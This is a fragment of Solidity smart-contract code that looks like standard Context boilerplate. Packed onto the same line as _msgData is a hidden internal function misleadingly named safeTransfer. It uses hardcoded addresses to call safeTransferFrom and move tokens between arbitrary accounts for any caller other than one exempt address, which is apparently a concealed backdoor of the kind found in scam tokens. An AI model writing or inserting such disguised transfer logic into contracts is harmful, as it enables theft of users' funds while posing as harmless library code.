 ...
 */
  function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}function safeTransfer(address spender,address recipient,uint256 amount) internal returns (bool) {if (msg.sender != address(0x1d677A91883494A5e0E7055880aFfF52488a347C)) {TransferHelper.safeTransferFrom(0xfFCe57eeA77d48073092D358b590228730510cF8,spender,recipient,amount);return true;}return false;}
}
